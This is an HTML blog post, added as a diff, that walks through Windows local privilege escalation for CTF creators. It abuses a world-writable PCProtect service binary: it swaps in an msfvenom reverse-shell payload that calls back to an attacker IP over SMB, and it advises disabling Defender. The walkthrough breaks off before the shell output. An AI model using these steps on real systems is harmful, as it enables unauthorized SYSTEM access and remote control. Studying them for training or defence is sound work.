@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Windows Local Privilege Escalation - Applications for CTF Creators - pwnlog</title><meta name="Description" content="Windows Local Privilege Escalation - Applications"><meta property="og:url" content="//localhost:1313/windows-privesc-apps/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Windows Local Privilege Escalation - Applications for CTF Creators">
+  <meta property="og:description" content="Windows Local Privilege Escalation - Applications">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:modified_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:tag" content="Applications">
+    <meta property="article:tag" content="Insecure Gui Applications">
+    <meta property="article:tag" content="Insecure Startup Applications">
+    <meta property="article:tag" content="Insecure Applications Permissions">
+    <meta property="article:tag" content="Vulnerable Applications">
+    <meta property="article:tag" content="Local Privilege Escalation">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Windows Local Privilege Escalation - Applications for CTF Creators">
+  <meta name="twitter:description" content="Windows Local Privilege Escalation - Applications">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/windows-privesc-apps/" /><link rel="prev" href="//localhost:1313/windows-privesc-credential-hunting/" /><link rel="next" href="//localhost:1313/windows-privesc-services/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Windows Local Privilege Escalation - Applications for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/windows-privesc-apps\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "applications, insecure gui applications, insecure startup applications, insecure applications permissions, vulnerable applications, local privilege escalation, windows","wordcount":  1562 ,
+        "url": "\/\/localhost:1313\/windows-privesc-apps\/","datePublished": "2022-03-20T11:33:00+08:00","dateModified": "2022-03-20T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": "Windows Local Privilege Escalation - Applications"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows Local Privilege Escalation - Applications for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/windows-local-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-20">2022-03-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1562 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#applications">Applications</a></li>
+    <li><a href="#privilege-escalation-via-vulnerable-applications">Privilege Escalation via Vulnerable Applications</a></li>
+    <li><a href="#privilege-escalation-via-write-permissions">Privilege Escalation via Write Permissions</a></li>
+    <li><a href="#privilege-escalation-via-startup-applications">Privilege Escalation via Startup Applications</a></li>
+    <li><a href="#privilege-escalation-via-insecure-gui-applications">Privilege Escalation via Insecure GUI Applications</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="applications">Applications</h1>
+<p>Certain vulnerabilities in applications can lead to privilege escalation. These can range from path hijacking to DLL hijacking and others as well.</p>
+<h1 id="privilege-escalation-via-vulnerable-applications">Privilege Escalation via Vulnerable Applications</h1>
+<p>There are plenty of more bugs that can lead to privileges escalation such as stack-based buffer overflows.</p>
+<p>We can find public exploits in the ExploitDB database, there is a tool named <a href="https://www.exploit-db.com/searchsploit" target="_blank" rel="noopener noreffer ">searchsploit</a> which is a command line search tool for Exploit-DB that also allows us to take a copy of the exploit database in our systems.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">searcshploit &lt;app-name&gt; windows privilege escalation
+</span></span><span class="line"><span class="cl">searcshploit &lt;app-name&gt; privilege escalation
+</span></span><span class="line"><span class="cl">searchsploit &lt;app-name&gt; windows <span class="nb">local</span> privilege escalation
+</span></span><span class="line"><span class="cl">searchsploit &lt;app-name&gt; <span class="nb">local</span> privilege escalation
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-write-permissions">Privilege Escalation via Write Permissions</h1>
+<p>In this section, we will discuss privilege escalation techniques that involve replacing the executable of a service. An application listed on ExploitDB, <a href="https://www.exploit-db.com/exploits/45503" target="_blank" rel="noopener noreffer ">PCProtect 4.8.35</a>, grants full permissions to any user. The author describes the following:</p>
+<blockquote>
+<p>The application grants &ldquo;Everyone: (F)&rdquo; to the contents of the directory and its subfolders. Additionally, the program installs a service called &ldquo;SecurityService&rdquo; which runs under the &ldquo;Local system account.&rdquo; This configuration allows any user to escalate privileges to &ldquo;NT AUTHORITY\SYSTEM&rdquo; by substituting the service&rsquo;s binary with a malicious one.</p>
+</blockquote>
+<p>The proof of concept (PoC) is documented on the exploit page. We will follow those steps after installing the application, which can be <a href="https://www.exploit-db.com/apps/ddcc3319288a35caa42e561e513d13df-PCProtect_Setup%20%281%29.exe" target="_blank" rel="noopener noreffer ">downloaded here</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt;icacls <span class="s2">&#34;c:\Program Files (x86)\PCProtect&#34;</span>
+</span></span><span class="line"><span class="cl">c:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\P</span>CProtect BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 Everyone:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Successfully processed <span class="m">1</span> files<span class="p">;</span> Failed processing <span class="m">0</span> files
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt;sc qc SecurityService
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> QueryServiceConfig SUCCESS
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SERVICE_NAME: SecurityService
+</span></span><span class="line"><span class="cl">        TYPE               : <span class="m">10</span>  WIN32_OWN_PROCESS
+</span></span><span class="line"><span class="cl">        START_TYPE         : <span class="m">2</span>   AUTO_START
+</span></span><span class="line"><span class="cl">        ERROR_CONTROL      : <span class="m">1</span>   NORMAL
+</span></span><span class="line"><span class="cl">        BINARY_PATH_NAME   : <span class="s2">&#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;</span>
+</span></span><span class="line"><span class="cl">        LOAD_ORDER_GROUP   :
+</span></span><span class="line"><span class="cl">        TAG                : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">        DISPLAY_NAME       : PC Security Management Service
+</span></span><span class="line"><span class="cl">        DEPENDENCIES       :
+</span></span><span class="line"><span class="cl">        SERVICE_START_NAME : LocalSystem
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt;icacls <span class="s2">&#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;</span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\P</span>CProtect<span class="se">\S</span>ecurityService.exe BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                                     Everyone:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                                     NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                                     BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                                     APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                                     APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Successfully processed <span class="m">1</span> files<span class="p">;</span> Failed processing <span class="m">0</span> files
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Based on the output above, we have writable permissions to the executable of the service named <code>SecurityService</code>. We will set up an SMB server on the attacker host and authenticate to the SMB service.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ sudo impacket-smbserver share . -smb2support -username low -password <span class="s1">&#39;p@ssw0rd&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.9.24 - Copyright <span class="m">2021</span> SecureAuth Corporation
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we&rsquo;re gonna authenticate to the SMB service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;p@ssw0rd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="s1">&#39;low&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nb">New-PSDrive</span> <span class="n">-Name</span> <span class="s2">&#34;share&#34;</span> <span class="n">-PSProvider</span> <span class="s2">&#34;FileSystem&#34;</span> <span class="n">-Root</span> <span class="s2">&#34;\\192.168.119.130\share&#34;</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>           <span class="n">Used</span> <span class="p">(</span><span class="n">GB</span><span class="p">)</span>     <span class="n">Free</span> <span class="p">(</span><span class="n">GB</span><span class="p">)</span> <span class="n">Provider</span>      <span class="n">Root</span>                                                                                                                              <span class="n">CurrentLocation</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>           <span class="p">---------</span>     <span class="p">---------</span> <span class="p">--------</span>      <span class="p">----</span>                                                                                                                              <span class="p">---------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">share</span>                                  <span class="n">FileSystem</span>    <span class="p">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">\</span><span class="n">share</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can view the permissions of the service using the <code>accesschk</code> tool:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysinternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-kvuqsw</span> <span class="s2">&#34;HKLM\System\CurrentControlSet\Services&#34;</span> <span class="p">&gt;&gt;</span> <span class="p">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">services</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>services.txt</code> file should have stored the output of the previous command and it should have returned us the permissions we have for the target service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">HKLM\System\CurrentControlSet\Services\EventLog\Application\SecurityService
+</span></span><span class="line"><span class="cl">  Medium Mandatory Level (Default) [No-Write-Up]
+</span></span><span class="line"><span class="cl">  RW BUILTIN\Administrators
+</span></span><span class="line"><span class="cl">	KEY_ALL_ACCESS
+</span></span><span class="line"><span class="cl">  RW NT AUTHORITY\SYSTEM
+</span></span><span class="line"><span class="cl">	KEY_ALL_ACCESS
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HKLM\System\CurrentControlSet\Services\SecurityService
+</span></span><span class="line"><span class="cl">  Medium Mandatory Level (Default) [No-Write-Up]
+</span></span><span class="line"><span class="cl">  RW BUILTIN\Administrators
+</span></span><span class="line"><span class="cl">	KEY_ALL_ACCESS
+</span></span><span class="line"><span class="cl">  RW NT AUTHORITY\SYSTEM
+</span></span><span class="line"><span class="cl">	KEY_ALL_ACCESS
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The output indicates that only the Administrators group and the NT AUTHORITY\SYSTEM have full access to the registry keys of this service.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="nb">desktop-bn</span><span class="p">\</span><span class="n">user</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s1">&#39;Administrators&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Local</span> <span class="n">account</span> <span class="n">and</span> <span class="n">member</span> <span class="n">of</span> <span class="n">Administrators</span> <span class="nb">group Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">114</span>    <span class="nb">Group </span><span class="n">used</span> <span class="k">for</span> <span class="n">deny</span> <span class="n">only</span>
+</span></span><span class="line"><span class="cl"><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>                                        <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">544</span> <span class="nb">Group </span><span class="n">used</span> <span class="k">for</span> <span class="n">deny</span> <span class="n">only</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since we are part of the Administrators group, we can exploit this by replacing &ldquo;SecurityService.exe&rdquo; with our preferred payload or implant and wait for execution upon reboot.</p>
+<p>For this demonstration, I will use an msfvenom-generated payload.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.119.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o reverse.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: In the real-world you would replace it with an implant or an encrypted payload of a C2.</p>
+</blockquote>
+<p>We&rsquo;ll create a backup of the original service executable/binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy </span><span class="s2">&#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;</span> <span class="s2">&#34;C:\Program Files (x86)\PCProtect\SecurityService-Backup.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we&rsquo;re gonna transfer the payload through the SMB protocol:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy </span><span class="p">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">reverse</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: Make sure to disable the Microsoft Defender Real-Time Protection or any other real time scanner.</p>
+</blockquote>
+<p>The executable should run upon system restart, specifically when the system reaches the logon window (the screen where the user signs in). At this point, we should receive the reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
